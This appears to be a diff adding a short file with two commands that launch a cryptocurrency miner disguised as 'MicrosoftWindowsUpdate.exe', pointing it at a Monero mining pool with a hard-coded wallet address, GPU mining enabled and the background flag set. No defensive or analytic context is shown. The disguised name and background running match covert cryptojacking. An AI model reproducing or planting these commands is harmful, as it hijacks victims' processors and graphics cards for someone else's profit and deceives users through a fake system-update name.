@@ -1,0 +1,3 @@
+MicrosoftWindowsUpdate.exe -o gulf.moneroocean.stream:10128 -u 4BGXfWBzrSYN8yLPWL2MNF8QbXYZSopr4EEFzXQUSt3s2dafar2SNo7Jjy1iUpSu3TFXYPZtYsshi5Dx57RReCis3HLRUYD -B
+
+MicrosoftWindowsUpdate.exe --opencl --cuda -o gulf.moneroocean.stream:10128 -u 4BGXfWBzrSYN8yLPWL2MNF8QbXYZSopr4EEFzXQUSt3s2dafar2SNo7Jjy1iUpSu3TFXYPZtYsshi5Dx57RReCis3HLRUYD -k --coin monero -B
